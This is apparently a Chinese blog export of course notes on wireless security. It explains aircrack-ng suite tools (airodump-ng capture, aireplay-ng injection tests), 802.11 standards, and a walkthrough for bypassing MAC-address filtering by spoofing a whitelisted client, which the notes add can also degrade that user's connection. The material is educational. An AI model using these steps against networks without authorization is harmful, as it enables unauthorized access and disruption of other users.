<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# iwconfig</span><br><span class="line">eth0      no wireless extensions.</span><br><span class="line"></span><br><span class="line">lo        no wireless extensions.</span><br><span class="line"></span><br><span class="line">wlan0     IEEE 802.11  ESSID:off/any</span><br><span class="line">          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm</span><br><span class="line">          Retry short limit:7   RTS thr:off   Fragment thr:off</span><br><span class="line">          Encryption key:off</span><br><span class="line">          Power Management:off</span><br></pre></td></tr></table></figure>
</li>
<li><p>此时ifconfig不可见wlan0（-a可见），因为其未被激活，<code>ifconfig wlan0 up</code>来启动</p>
</li>
</ul>
</li>
</ul>
<h2 id="03-airodump-ng（抓包）"><a href="#03-airodump-ng（抓包）" class="headerlink" title="03-airodump-ng（抓包）"></a>03-airodump-ng（抓包）</h2><h3 id="3-1-无线抓包"><a href="#3-1-无线抓包" class="headerlink" title="3.1-无线抓包"></a>3.1-无线抓包</h3><ul>
<li><p>简介</p>
<ul>
<li>也可以用wireshark和tcpdump等工具来抓包，但是含大量的其它的数据包（网络层的、传输层的），此外抓到的无线包字段等信息混乱，观察不方便</li>
<li><code>airodump-ng</code>是专门针对无线数据包抓取的，且显示友好（自动对各字段进行排序等操作，便于观察</li>
</ul>
</li>
<li><p><code>airodump-ng wlan2mon</code>（抓包之前先启用monitor模式）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CH 11 ][ Elapsed: 2 mins ][ 2018-02-02 00:50 ][ paused output</span><br><span class="line">  </span><br><span class="line">BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID</span><br><span class="line">  </span><br><span class="line">30:B4:9E:95:AB:9E  -42       33        3    0  11  54e. WPA2 CCMP   PSK  11111</span><br><span class="line">18:4F:32:B3:A7:93  -54       28        1    0  10  54e. WPA2 CCMP   PSK  na</span><br><span class="line">4A:C2:DD:C8:57:07  -57       35        3    0  11  54e. WPA2 CCMP   PSK  360▒..费WiFi-N1</span><br><span class="line">02:1A:11:F7:B9:2C  -59       41        0    0   3  54e  WPA2 CCMP   PSK  ▒..大海</span><br><span class="line">20:6B:E7:42:38:AE  -59       35        0    0   2  54e. WPA2 CCMP   PSK  mayizhengzhuang1</span><br><span class="line">22:08:B1:C6:C1:2F  -59       30        0    0  11  54e. WPA2 CCMP   PSK  360▒..费wifi▒..</span><br><span class="line"></span><br><span class="line">   BSSID              STATION            PWR   Rate    Lost    Frames  Probe</span><br><span class="line">  </span><br><span class="line">  (not associated)   AC:D1:B8:C7:DC:3F  -40    0 - 1      0        1</span><br><span class="line">  (not associated)   54:35:30:09:76:81  -48    0 - 1      0        3</span><br><span class="line">  (not associated)   3C:F5:91:66:6C:C9  -50    0 - 1      0        7</span><br><span class="line">  (not associated)   B8:86:87:DA:68:B1  -56    0 - 1      0        4</span><br></pre></td></tr></table></figure>
<ul>
<li>尽管启动网卡的监听模式后，查看其信道后，其是工作在特定信道上的（可以手工指定）<ul>
<li>但是在抓包时，其会处于一种hooping模式，轮循各个信道（1-13），从而得到各个信道中存在的AP</li>
<li>运行后，是动态变化的，空格可暂停其变化</li>
</ul>
</li>
</ul>
</li>
<li><p><code>airodump-ng wlan0mon -c 3</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CH  3 ][ Elapsed: 0 s ][ 2018-02-02 01:12 ][ paused output</span><br><span class="line">  </span><br><span class="line">BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID</span><br><span class="line">  </span><br><span class="line">6A:3E:34:02:01:35  -77   0        3        0    0   2  54e. WPA  CCMP   PSK  m2 note</span><br><span class="line">1A:E3:47:F2:6A:E3  -73   0       13        0    0   3  54e. WPA2 CCMP   PSK  360▒..费WiFi-LG</span><br><span class="line">20:6B:E7:42:38:AE  -62   0       20        0    0   2  54e. WPA2 CCMP   PSK  mayizhengzhuang1</span><br><span class="line">76:DF:BF:43:92:8D  -67   0        2        0    0   1  54e. WPA2 CCMP   PSK  YAN</span><br><span class="line">88:25:93:A5:4C:1F  -73   0       21       34   15   3  54e. WPA2 CCMP   PSK  xdhj</span><br><span class="line">02:1A:11:F7:B9:2C  -62 100       23        0    0   3  54e  WPA2 CCMP   PSK  ▒..大海</span><br><span class="line">14:2D:27:E8:98:7D  -69   0        0        0    0  11  54e  WPA2 CCMP   PSK  ALENOVO-PC</span><br><span class="line">  </span><br><span class="line">BSSID              STATION            PWR   Rate    Lost    Frames  Probe</span><br><span class="line">  </span><br><span class="line">(not associated)   D0:57:7B:1D:84:72  -66    0 - 1      2        5</span><br><span class="line">(not associated)   A0:88:69:33:13:DC  -64    0 - 1      0        3</span><br><span class="line">88:25:93:A5:4C:1F  28:E3:47:F2:6A:E3  -74    0e- 0e     0        7</span><br><span class="line">88:25:93:A5:4C:1F  FC:1A:11:87:78:D8   -1    0e- 0      0        1</span><br></pre></td></tr></table></figure>
<ul>
<li>抓包时指定信道（否则轮循1-13，各个信道都检测</li>
<li>此时结果中会出现PXQ一列（不指定的话便没有）</li>
<li>但是结果中，AP部分也会出现其它信道的AP，因为各个信道是存在交叉重叠的</li>
</ul>
</li>
<li><p><code>airodump-ng wlan0mon --bssid AE:D1:B8:C7:D4:3F -c 11 -w test</code></p>
<ul>
<li><p>-c指定信道</p>
</li>
<li><p>–bssid，指定抓取某AP的数据包</p>
</li>
<li><p>-w，将结果保存至本地，cap文件可wireshark打开，详细查看其通信</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# ls test*</span><br><span class="line">test-01.cap  test-01.csv  test-01.kismet.csv  test-01.kismet.netxml</span><br></pre></td></tr></table></figure>
</li>
<li><p>指定特定信道和bssid后，从结果中可以看到连接到它的STA的信息，如MAC地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CH 11 ][ Elapsed: 1 min ][ 2018-02-02 01:28 ][ paused output</span><br><span class="line">    </span><br><span class="line">BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSI</span><br><span class="line">AE:D1:B8:C7:D4:3F  -26   0      660       88    0  11  54e  WPA2 CCMP   PSK  DELL</span><br><span class="line">    </span><br><span class="line">BSSID              STATION            PWR   Rate    Lost    Frames  Probe</span><br><span class="line">AE:D1:B8:C7:D4:3F  A4:5E:60:BA:D2:23  -46    0e-11e     0      131</span><br></pre></td></tr></table></figure>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-2/32103618.jpg?ynotemdtimestamp=1550490800086" alt="img"></p>
</li>
</ul>
</li>
<li><p>其它参数</p>
<ul>
<li><code>--ivs：Save only captured IVs</code>，适合为破解WEP收集IVs（初始向量），再用这些IVs来破解密码</li>
</ul>
</li>
</ul>
<h3 id="3-2-输出结果分析"><a href="#3-2-输出结果分析" class="headerlink" title="3.2-输出结果分析"></a>3.2-输出结果分析</h3><p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-2/59161236.jpg?ynotemdtimestamp=1550490800086" alt="img"></p>
<h4 id="（1）最上面一行："><a href="#（1）最上面一行：" class="headerlink" title="（1）最上面一行："></a>（1）最上面一行：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CH 12 ][ Elapsed: 8 mins ][ 2018-02-02 00:56 ][ paused output</span><br></pre></td></tr></table></figure>
<ul>
<li>依次是当前信道（轮循的）</li>
<li>已经工作的时间</li>
<li>系统当前时间</li>
<li>除上述三个字段外，后面还会有其它字段（默认是没有显示的<ul>
<li><code>[ paused output</code>提示暂停输出（可按空格停止其动态变化）</li>
<li><code>[ rusumed ouput</code>表正正在输出</li>
<li>其它情况，如果存在WAP/WPA2的AP，有一个客户端连接上AP，其四步握手过程被抓到时，就会显示有一个四步握手被抓到，并将相应的AP的MAC地址显示在此位置（这个数据会被抓取下来）</li>
<li>如果存在一个WEP的AP，有新客户端连接时，会抓到challenge信息（明文的cha和经过密钥流加密的密文cha，二者异或，可以得到密钥流，此时，这个密钥流文件会自动保存到本地，以.xor结尾的一个文件，其文件内容时密文，H可以利用其与AP认证，从而进一步与其建立关联关系，进一步实施攻击，后续WEP攻击会讲到）</li>
</ul>
</li>
</ul>
<h4 id="（2）上面部分：AP信息"><a href="#（2）上面部分：AP信息" class="headerlink" title="（2）上面部分：AP信息"></a>（2）上面部分：AP信息</h4><p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-2/75041727.jpg?ynotemdtimestamp=1550490800086" alt="img"></p>
<ul>
<li><p>BSSID：AP的MAC地址，如win10开的热点</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Microsoft Wi-Fi Direct Virtual Adapter #3</span><br><span class="line">        Link encap: IEEE 802.11 HWaddr: AE-D1-B8-C7-D4-3F</span><br><span class="line">        inet addr:192.168.137.1 Mask: 255.255.255.0</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
</li>
<li><p>PWR：即power</p>
<ul>
<li>网卡接收到的信号强度，距离越近信号越强</li>
<li>越接近0表示信号强度越强（即绝对值越大越强<ul>
<li>小于50：优</li>
<li>小于75：良</li>
<li>大于75：信号较弱</li>
<li>超过130即认为是不可接收，就会显示-1，</li>
</ul>
</li>
<li>-1的情况 ：<ul>
<li>驱动不支持信号强度</li>
<li>本机距离AP太远，即信号太弱（对本机而言；AP部分的PWR）</li>
<li>本机连接AP，AP上还连接了另一个STA，本机与这个STA相距远（STA部分的PWR）</li>
</ul>
</li>
</ul>
</li>
<li><p>RXQ：最近10秒成功接收的数据帧的百分比（数据帧、管理帧）</p>
<ul>
<li>数据帧和管理帧中都会有数据内容（不严格来讲，数据帧就是包括数据帧和管理帧的），而控制帧是没有的</li>
<li>是根据接收到的数据帧中的sequence number来判断的，</li>
<li>接受成功的/总接受的，是一个比值（数据是可能接收失败的）</li>
<li>只有在固定信道时才会出现</li>
</ul>
</li>
<li><p>Beacons：接收到此AP发送的beacon帧数量</p>
</li>
<li><p><code>#data</code>：抓到的数据帧数量</p>
<ul>
<li>可以应用到WEP场景：若是WEP，则此字段可以反映IV数量（WEP要收集 IV来破解密码）</li>
<li>是一个累积的值（而非10秒内等某个时间端的），并且包含广播数据帧（不止单播帧</li>
</ul>
</li>
<li><p><code>#/s</code></p>
<ul>
<li>最近10秒内，每秒平均抓到的帧的数量</li>
<li>不止数据帧，还有其它另外两种，都包含在内</li>
</ul>
</li>
<li><p>CH：信道号（从beacon帧中获得）</p>
<ul>
<li>信道重叠时可能发现其它信道</li>
<li>即使指定信道，因为信道叠加的原因，也可以发现结果中有其它信道</li>
</ul>
</li>
<li><p>MB：AP支持的最大速率</p>
</li>
<li><p>ENC：采用的无线安全技术，如：WEP、WPA、WPA2、OPEN</p>
</li>
<li><p>cipher：采用的加密套件，如：CCMP（目前来讲最安全）、TKIP、WEP40、WEP104</p>
</li>
<li><p>auth：身份认证方法，如：</p>
<ul>
<li>MGT（WPA企业时，在后端有身份认证服务器，需要账号密码登录 ）、</li>
<li>PSK（家用路由器，WPA的预设共享密钥）、</li>
<li>SKA（如果WEP而非WPA ，则就是SKA，其便是WEP的预设共享密钥）、</li>
<li>OPEN（不要密码的那种）</li>
</ul>
</li>
<li><p>ESSID：无线网络名称</p>
<ul>
<li>若是隐藏AP，此值可能为空</li>
<li>可以显示隐藏AP的长度，如上图的<code>&lt;length:32&gt;</code></li>
<li>airodump从probe和association request帧中发现隐藏AP<ul>
<li>AP会隐藏自己，但是要连接他的STA不会帮他隐藏</li>
<li>若airodump-ng抓到相关包，也会在此字段显示出其ESSID</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="（3）下面部分：STA信息"><a href="#（3）下面部分：STA信息" class="headerlink" title="（3）下面部分：STA信息"></a>（3）下面部分：STA信息</h4><p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-2/21291254.jpg?ynotemdtimestamp=1550490800086" alt="img"></p>
<ul>
<li>两种情况<ul>
<li>STA离本机比较近，故本机网卡也能探测到其的存在</li>
<li>STA离本机远（PWR为-1），但是本机网卡与其连接的AP距离近，从而也能探测到这种STA的存在</li>
</ul>
</li>
<li>BSSID<ul>
<li>若STA关联到AP，则显示AP的MAC地址</li>
<li>若未关联，则（not associated）</li>
</ul>
</li>
<li>STATION：终端设备的MAC地址</li>
<li>PWR：信号强度，与AP部分的类似，若是-1，则表示本机与其相距太远，攻击就会受影响</li>
<li>Rate：传输速率</li>
<li>Lost：通过sequence number 判断最近10秒sta发送丢失的数据包数量<ul>
<li>包括管理帧、数据帧（二者都含有数据部分，而控制帧没有）</li>
<li>导致Lost太多的原因<ul>
<li>干扰、距离</li>
<li>无线网卡使发包不能收、收包不能发的（若处于侦听状态，在收包，其发包就会受影响</li>
</ul>
</li>
</ul>
</li>
<li>Frames：STA发送的数据包数量</li>
<li>Probe：STA探测的ESSID</li>
</ul>
<h3 id="3-3-常见问题及解决"><a href="#3-3-常见问题及解决" class="headerlink" title="3.3-常见问题及解决"></a>3.3-常见问题及解决</h3><ul>
<li>不显示任何AP和STA信息<ul>
<li>物理机场景下使用笔记本内置无线网卡时，确保BIOS中已启用无线网卡</li>
<li>确认无线网卡在managed模式下可以正常工作</li>
<li>尝试禁用network-managed服务</li>
<li>尝试卸载rmmod和重新加载modprobe驱动</li>
</ul>
</li>
<li>工作一段时间后airodump-ng<ul>
<li>airmon-ng check kill</li>
<li>确认wpa_supplicant进程已停止</li>
</ul>
</li>
</ul>
<h2 id="04-aireplay-ng（注入）"><a href="#04-aireplay-ng（注入）" class="headerlink" title="04-aireplay-ng（注入）"></a>04-aireplay-ng（注入）</h2><h3 id="4-1-简介"><a href="#4-1-简介" class="headerlink" title="4.1-简介"></a>4.1-简介</h3><ul>
<li>注入包的目的：产生或者加速无线通信流量</li>
<li><p>向无线网络中注入数据包，可以：</p>
<ul>
<li>伪造身份验证</li>
<li>强制重新身份验证（伪造正常STA，断掉其与AP的连接，STA会尝试重新连接，再抓包，从而得到相关信息）</li>
<li>抓包，处理后重放（作为中间人）</li>
</ul>
</li>
<li><p>用于后续WEP和WPA密码破解</p>
</li>
<li><p>格式：<code>aireplay-ng &lt;option&gt; &lt;interface name&gt;</code>（接口需处于monitor模式）</p>
</li>
<li><p>aireplay-ng：支持10种包注入的方式（0-9）</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-2/2545645.jpg?ynotemdtimestamp=1550490800086" alt="img"></p>
</li>
<li><p>获取包的两种途径，即数据包的来源</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-2/98016684.jpg?ynotemdtimestamp=1550490800086" alt="img"></p>
<ul>
<li>指定接口抓到的数据包（-i</li>
<li>指定抓包文件pcap（-r</li>
</ul>
</li>
<li><p>Filter 命令选项（除0、1两种攻击方式</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-2/85851087.jpg?ynotemdtimestamp=1550490800086" alt="img"></p>
<ul>
<li>抓包后，一般要经过筛选等处理后，再重新发送出去</li>
</ul>
</li>
<li><p>Replay命令选项（重放）</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-2/15304207.jpg?ynotemdtimestamp=1550490800086" alt="img"></p>
</li>
</ul>
<h3 id="4-2-常见问题及解决"><a href="#4-2-常见问题及解决" class="headerlink" title="4.2-常见问题及解决"></a>4.2-常见问题及解决</h3><ul>
<li>aireplay-ng命令挂起没有任何输出<ul>
<li>无线网卡与ap工作在不同信道</li>
</ul>
</li>
<li>报错“write failed: Cannot allocate memory wi_write(): illegal seek”<ul>
<li>无线网卡使用Broadcom芯片（bcm43xx），替换为b43驱动可解决</li>
</ul>
</li>
<li>可注入但速度很慢，并提示内核消息“rtc: lost some interrupts at 1024Hz”<ul>
<li>没有修正方法，此时可以启动多个aireplay-ng命令提高速度</li>
</ul>
</li>
<li>使用-h参数指定注入MAC地址与网卡MAC地址不一致报错<ul>
<li>建议保持一致<ul>
<li>macchanger命令更改MAC地址</li>
<li>更改之前先将网卡down掉</li>
</ul>
</li>
<li>00:11:11:11:11:11 / -h 00:22:22:22:22:22</li>
</ul>
</li>
</ul>
<h3 id="4-3-aireplay-ng包注入测试"><a href="#4-3-aireplay-ng包注入测试" class="headerlink" title="4.3-aireplay-ng包注入测试"></a>4.3-aireplay-ng包注入测试</h3><ul>
<li><p>简介</p>
<ul>
<li>检测网卡是否可以注入包（-9参数）</li>
<li>检测AP的响应时间（回包率反映链路质量）</li>
<li>如果有两个无线网卡，可以检测具体可以注入哪种攻击<ul>
<li>只有一个，则只可以-9来最基本的检测</li>
<li>有两个，则可以互相测试，进一步检测可以支持的攻击</li>
</ul>
</li>
<li>基本测试检测AP对probe广播的响应<ul>
<li>向AP发30个数据包</li>
<li>网卡成功发送并可接收包的能力</li>
</ul>
</li>
</ul>
</li>
<li><p>基本测试：<code>aireplay-ng -9 wlan2mon</code></p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-2/72745635.jpg?ynotemdtimestamp=1550490800086" alt="img"></p>
<ul>
<li><code>09:20:16 Injection is working!</code>：表示当前网卡及驱动是支持注入的</li>
<li><code>Trying broadcast probe requests...</code>：发广播包，探测周围存在的AP</li>
<li><code>Found 7 APs</code>：发现了7个AP</li>
<li><code>Trying directed probe requests...</code>：接下来对每个AP进行probe探测</li>
<li><code>19/30: 63%</code>：每次发30个包，根据其百分比看出其能力（发包及接收包的能力</li>
</ul>
</li>
<li><p>向隐藏AP/指定ssid注入：<code>aireplay-ng -9 -e huazhu-hanting -a 88:25:93:CA:98:A2 wlan0mon</code></p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-2/12690651.jpg?ynotemdtimestamp=1550490800086" alt="img"></p>
<ul>
<li>-e：指定ESSID，即无线名字</li>
<li>-a：指定无线AP的MAC地址</li>
<li>此时就不是一个广播了，是由针对性的单播</li>
<li>若信道不一致，则更换一个与wlan0mon同信道的AP来探测（aireplay-ng无法手动指定信道，只能换AP来测试）</li>
</ul>
</li>
<li><p>card to card注入测试</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-2/27714946.jpg?ynotemdtimestamp=1550490800086" alt="img"></p>
<ul>
<li>若有两块无线网卡，都置于monitor模式，可以做网卡-网卡的注入</li>
<li>检测结果更加准确、精细，可以检测0-8这几种方式是否都支持</li>
<li>网卡a去发包，发到b，网卡b接受包（b模拟AP接受数据包），若b能接受并返回包，则说明二者支持这种类型的包</li>
<li>-i参数：指定作为AP的网卡（另外一个网卡发包用</li>
<li>如图：5/7 Failed<ul>
<li>可能是真的不支持这两种类型（但是在其它类型都支持的情况下，这种可能性很小</li>
<li>实践中：只要保证注入Mac和真实Mac相同，那么是可以正常使用的（-h指定</li>
</ul>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>无线安全</category>
      </categories>
      <tags>
        <tag>无线安全</tag>
        <tag>Tool</tag>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title>802.11标准</title>
    <url>/2018/02/18/wireless/802-11%E6%A0%87%E5%87%86/</url>
    <content><![CDATA[<h1 id="802-11标准"><a href="#802-11标准" class="headerlink" title="802.11标准"></a>802.11标准</h1><h2 id="课程简介"><a href="#课程简介" class="headerlink" title="课程简介"></a>课程简介</h2><ul>
<li>与其它章节独立，涵盖面广，可独立成课</li>
<li>无线技术变化快，难度大</li>
<li>即新鲜刺激又压力山大（不会研究很深</li>
<li>一半理论一半实践，理论是最有价值的东西，网上文章多实践</li>
<li>无线技术难度最大，如协议结构知识点<a id="more"></a></li>
</ul>
<h2 id="无线技术特点"><a href="#无线技术特点" class="headerlink" title="无线技术特点"></a>无线技术特点</h2><ul>
<li>行业发展迅速</li>
<li>互联网重要入口</li>
<li>边界模糊</li>
<li>安全实施缺失且困难</li>
<li>对技术不了解而造成配置不当</li>
<li>企业网络私自接入AP破坏网络边界</li>
</ul>
<h2 id="IEEE"><a href="#IEEE" class="headerlink" title="IEEE"></a>IEEE</h2><ul>
<li>一个协会，由各方面科学家组成，目的是制定标准，指导行业技术的发展</li>
<li>分为不同的技术委员会，其中802委员会负责lan、man的制定（局域网、城域网）</li>
<li>802委员会成果如<ul>
<li>以太网：802.3</li>
<li>无线局域网：802.11</li>
<li>令牌环网：802.5</li>
<li>城域网：802.6</li>
</ul>
</li>
</ul>
<h2 id="802-11工作在"><a href="#802-11工作在" class="headerlink" title="802.11工作在"></a>802.11工作在</h2><ul>
<li>物理层</li>
<li>数据链路层<ul>
<li>逻辑链路控制子层LLC</li>
<li>媒体访问控制子层MAC</li>
</ul>
</li>
<li>只七层模型的下面两层，其它以上的层如网络层传输层不涉及</li>
</ul>
<h2 id="802-11协议族-版本"><a href="#802-11协议族-版本" class="headerlink" title="802.11协议族/版本"></a>802.11协议族/版本</h2><ul>
<li>802委员会第11组负责开发无线局域网标准</li>
<li>IEEE 802.11 a/b/c/d/e等小写字母的：非标准版本，是对上次的修正和完善</li>
<li>IEEE 802.11 F：为大写字母，表示是正式版本（包括F在内，有三个标准的</li>
<li>除了a-z这26个，还有其它，如802.11 mb/aa/ac</li>
</ul>
<h2 id="日常使用的：802-11-、802-11-a-b-g-i-n"><a href="#日常使用的：802-11-、802-11-a-b-g-i-n" class="headerlink" title="日常使用的：802.11 、802.11 a/b/g/i/n"></a>日常使用的：802.11 、802.11 a/b/g/i/n</h2><ul>
<li>802.11: 最原始的WLAN标准，也称legacy<ul>
<li>起初设想信号传播方式：红外线和无线电播</li>
</ul>
</li>
<li>a：5GHz，54Mbit/s（注：网络相关：用位，bit，而物理硬盘传输：byte用字节）</li>
<li>b：2.4GHz，5.5和11Mbit/s<ul>
<li>严格意义上Wi-Fi，仅针对b，其它的不能成为Wi-Fi</li>
</ul>
</li>
<li>g：2.4G，54M，兼容b</li>
<li>n：最常见，提供高的传输速率</li>
<li>i也较少，与安全性相关</li>
</ul>
<h2 id="802-11"><a href="#802-11" class="headerlink" title="802.11"></a>802.11</h2><ul>
<li>发布于1997年</li>
<li>速率1Mbps或2Mbps</li>
<li>红外线传输介质<ul>
<li>并未实际实现，仅在理论层面</li>
<li>因为红外线会受障碍物限制</li>
<li>故最后主流传输介质还是射频，即radio</li>
</ul>
</li>
<li>无线射频信号编码<ul>
<li>射频是主流传输介质</li>
<li>有两种技术<ul>
<li>DSSS：直序扩频</li>
<li>FHSS：跳频扩频</li>
</ul>
</li>
<li>频宽资源是有限的，要传输大量资源，就需要扩频技术（只为提高速率，与窃听机密无关）</li>
<li>无线频宽都是受严格控制的<ul>
<li>军事的频宽高，而个人或企业的频宽低</li>
<li>日程收音机是低频宽的，无法听到高频宽的军事等（并非技术问题，而是厂商严格控制</li>
<li>国家也会严密监控，私自到高频宽可听到机密，犯法行为</li>
</ul>
</li>
</ul>
</li>
<li>使用的媒体访问方式：CSMA/CA<ul>
<li>载波侦听，多路访问，冲突避免</li>
<li>以太网的CSMA/CD，是冲突检测</li>
<li>其思想与CSMA/CD类似，除了后面的冲突检测<ul>
<li>避免两个数据包发生冲突</li>
<li>发送数据包前会先发包声明</li>
<li>根据算法侦听一定时长</li>
</ul>
</li>
</ul>
</li>
<li>为了更好的避免冲突，又引入RTS和CTS<ul>
<li>request to send</li>
<li>clear to send</li>
</ul>
</li>
<li>扩频相关公式：c=b+log2（1+s/n）<ul>
<li>s：传输的数据量</li>
<li>b：频宽</li>
<li>s：信号强度</li>
<li>n：噪声</li>
<li>s/n：信噪比</li>
<li>要增大传输量，则b+，s+，n-</li>
</ul>
</li>
</ul>
<h2 id="802-11-b"><a href="#802-11-b" class="headerlink" title="802.11 b"></a>802.11 b</h2><ul>
<li>是802.11的改良完善版本</li>
<li>增加了CCK，即补偿代码键<ul>
<li>传输速率提高：5.5 and 11Mbps</li>
<li>明确使用2.4GHz的带宽band，在2.4-2.485之间<ul>
<li>分成11或13或14个信道</li>
<li>配置路由器时会后信道的设置，可以手动指定，也可以自适应</li>
</ul>
</li>
<li>最多14个信道<ul>
<li>每个信道22MHz的带宽</li>
<li>信道会有重叠（因为前后相减，除以14，小于22</li>
<li>每个信道都会有一个带宽值，是一个中位数，距离左11，距离右11</li>
</ul>
</li>
<li>只有三个完全不重叠的信道<ul>
<li>若两信道重叠，且距离比较近，则会干扰，影响通信</li>
<li>85分给14个，且要每个22，则必然不重叠的会很少</li>
<li>85/22取整后为3</li>
</ul>
</li>
<li>不同国家对信道的利用策略<ul>
<li>美国：1-11个信道（2.412-2.462</li>
<li>欧洲：1-13个信道（2.412-2.472</li>
<li>日本：1-14个信道（2.412-2.484</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="802-11-a"><a href="#802-11-a" class="headerlink" title="802.11 a"></a>802.11 a</h2><ul>
<li>与802.11b几乎同时发布（因设备价格问题没有得到广泛使用</li>
<li>使用5GHz带宽<ul>
<li>2.4GHz带宽 干扰源多（微波炉、蓝牙、家用的无绳电话</li>
<li>5GHz频率有更多带宽空间，可容纳更多不重叠的信道</li>
<li>出现新的信号调制方法：OFDM，正交频分复用技术</li>
<li>更高速率54Mbps，每个信道20Mhz带宽</li>
<li>变频<ul>
<li>5.15-5.35GHz：用于室内</li>
<li>5.7-5.8 GHz：用于室外</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="802-11-g"><a href="#802-11-g" class="headerlink" title="802.11 g"></a>802.11 g</h2><ul>
<li>在b的基础上的扩展</li>
<li>目的是在2.4GHz上达到与a相同的速率（目标已达成</li>
<li>2.4GHz频率</li>
<li>信号调制方法为：OFDM</li>
<li>与802.11 a速率相同</li>
<li>可全局降速，向后兼容802.11吧，并切换为CCK信号调制方法</li>
<li>每个信道20/22MHz带宽（可变的信号带宽</li>
</ul>
<h2 id="802-11-n"><a href="#802-11-n" class="headerlink" title="802.11 n"></a>802.11 n</h2><ul>
<li>2.4或5GHz频率（兼容这两种<ul>
<li>速度300Mbps，最高600Mbps</li>
<li>新的通信技术，MIMO：多进多出通信技术</li>
<li>多天线，多无线电播，独立收发信号，来实现MIMO</li>
<li>可使用40MHz信道带宽，使传输速率翻倍</li>
</ul>
</li>
<li>在全n的设备网络中，可以使用新报文格式，使速率达到最大（若出现一个b，则也会降速，向其兼容</li>
<li>每个信道20huo40MHz</li>
</ul>
]]></content>
      <categories>
        <category>无线安全</category>
      </categories>
      <tags>
        <tag>无线安全</tag>
        <tag>802.11</tag>
      </tags>
  </entry>
  <entry>
    <title>其它无线攻击&amp;工具</title>
    <url>/2018/02/18/wireless/%E5%85%B6%E5%AE%83%E6%97%A0%E7%BA%BF%E6%94%BB%E5%87%BB-%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<h1 id="01-MAC地址绑定攻击"><a href="#01-MAC地址绑定攻击" class="headerlink" title="01-MAC地址绑定攻击"></a>01-MAC地址绑定攻击</h1><h2 id="1-1-简介"><a href="#1-1-简介" class="headerlink" title="1.1-简介"></a>1.1-简介</h2><ul>
<li>管理员误以为MAC地址绑定是一种安全机制</li>
<li>AP限制可以关联的客户端MAC地址，白名单的思想</li>
<li>准备测试AP<ul>
<li>完成基本的AP配置</li>
<li>开启open认证（测试用，所以不采用WEP或WPA<a id="more"></a></li>
<li>开启无线过滤（只有添加进白名单的MAC地址，其对应的STA才允许加入网络</li>
</ul>
</li>
<li>突破思路：修改MAC地址绕过过滤，即伪造自己的MAC地址，改为白名单中的，绕过白名单过滤，以实现上网</li>
<li>总结：<ul>
<li>虽然可以实现上网，但是修改了MAC地址，这样同一个AP下，有两个相同的MAC地址，会产生冲突，影响通信质量</li>
<li>如，H用户改为了U的MAC地址，H用户pingAP时，AP的响应包可能会发往U（因为二者 MAC地址相同），H端就会产生丢包</li>
<li>当U退出此网络时，H便充当U，这时MAC地址不会冲突，通信质量也可以保证，当U重新上线时，MAC又冲突，通信质量又下降</li>
<li>可以作为对正常用户U的攻击手段，使其网速慢</li>
</ul>
</li>
</ul>
<h2 id="1-2-大体流程"><a href="#1-2-大体流程" class="headerlink" title="1.2-大体流程"></a>1.2-大体流程</h2><ol>
<li>开启airmon监听，airodump抓包，得到某AP下连接的用户U的MAC地址，MAC1</li>
<li>macchanger改变本网卡的MAC地址为MAC1，便可以突破白名单的过滤</li>
<li>成功后，便可发现本网卡已得到AP分配的IP地址，实现上网</li>
<li>另一方面，此时，若用户U也在线，便可以拉低U的网速</li>
</ol>
<h1 id="02-aircrqck-ng-suite其它工具"><a href="#02-aircrqck-ng-suite其它工具" class="headerlink" title="02-aircrqck-ng suite其它工具"></a>02-aircrqck-ng suite其它工具</h1><h2 id="2-1-airdecap-ng"><a href="#2-1-airdecap-ng" class="headerlink" title="2.1-airdecap-ng"></a>2.1-airdecap-ng</h2><ul>
<li>去除802.11头<ul>
<li>airdecap-ng -b <ap mac> 1.pcap</ap></li>
</ul>
</li>
<li>解密wep加密数据<ul>
<li>airdecap-ng -w <wep key>-b <ap mac> 1.pcap</ap></wep></li>
<li>必须有与ap建立关联关系</li>
</ul>
</li>
<li>解密WPA加密数据<ul>
<li>airdecap-ng -e kifi -p <psk> -b <ap mac> 1.pcap</ap></psk></li>
<li>抓包文件中必须包含4步握手信息，否则无解</li>
</ul>
</li>
</ul>
<h2 id="2-2-airserv-ng"><a href="#2-2-airserv-ng" class="headerlink" title="2.2-airserv-ng"></a>2.2-airserv-ng</h2><ul>
<li>通过网络提供无线网卡服务器<ul>
<li>某些网卡不支持客户端/服务器模式</li>
</ul>
</li>
<li>启动无线侦听</li>
<li>服务器端<ul>
<li>airserv-ng -p 3333 -d wlan2mon</li>
</ul>
</li>
<li>客户端<ul>
<li>airodump-ng 192.168.1.1:3333</li>
</ul>
</li>
